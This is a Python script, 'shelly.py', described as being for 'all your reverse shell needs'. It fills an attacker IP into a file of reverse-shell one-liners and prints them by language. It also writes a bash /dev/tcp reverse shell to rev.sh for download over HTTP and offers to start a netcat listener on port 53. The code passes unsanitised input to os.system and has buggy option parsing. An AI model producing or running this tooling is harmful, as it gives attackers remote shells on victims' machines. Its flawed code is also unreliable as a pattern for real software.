#!/usr/bin/python3
import os, sys, getopt
from sys import argv
from colorama import Fore, Back, Style
def main(argv):
# Setup script
  lang = "all"
  ip = ''
  try:
    opts, args = getopt.getopt(argv,"hl:i",["lang=","ip="])
  except getopt.GetoptError:
    print  ('shelly.py -l <programming language> -i <listening IP>')
    print ("languages: all(prints all options), perl, python, bash")
    sys.exit(2)
  for opt, arg in opts:
    if opt == 'h':
      print ('shelly.py -l <programming language> -i <listening IP>')
      print ("languages: perl, python, bash")
      sys.exit()
    elif opt in ("-l", "--langs"):
      if lang not in ("all", "bash", "python", "perl", "ruby", "telnet", "nc", "wget", "php"):
        print ("Cannot find language, printing all")
        print ("languages: all(prints all options), bash, python, perl, ruby, telnet, nc, wget, php")
        lang = "all"
      else:
        lang = arg
    elif opt in ("-i", "--ip"):
      ip = arg
# Welcome message
  os.system("clear")
  print (Fore.GREEN + "------------------------------------------------------------")
  print (Fore.GREEN + "shelly.py - for all your reverse shell needs")
  print (Fore.GREEN + "------------------------------------------------------------")
  print(Style.RESET_ALL)
  print ("Printing shells for language = " + lang +", inserting ip = " + ip + "...")
  print ("\n\n The following one liners match your search: ")

# adding given IP to rev shells
  os.system("sed 's/{IP}/"+ ip +"/g' revshells.txt > /tmp/revshells.txt")

# searching for matches and printing results
  file = open("/tmp/revshells.txt", "r")
  
  if lang == "all":
    os.system("cat /tmp/revshells.txt")
  elif lang == "wget":
      print ("You will need to make the file rev.sh available over http: 'python -m SimpleHTTPServer 8083' would work")
      os.system("echo 'bash -i >& /dev/tcp/"+ ip + "/53 0>&1' > rev.sh")
  else:
    for line in file:
      if lang in line:
        print("\n\t" + line)
  file.close()

# Can start reverse shell if required
  print (Fore.RED + "Would you like to start a reverse shell?")
  answer = input("(y/N) ")
  print(Style.RESET_ALL)
  if answer in ("yes", "y"):
    print("Loading reverse shell on port 53")
    os.system("nc -lvp 53")
  else:
    print ("Happy Hacking, exiting...")
    sys.exit()


if __name__ == "__main__":
  main(argv[1:])
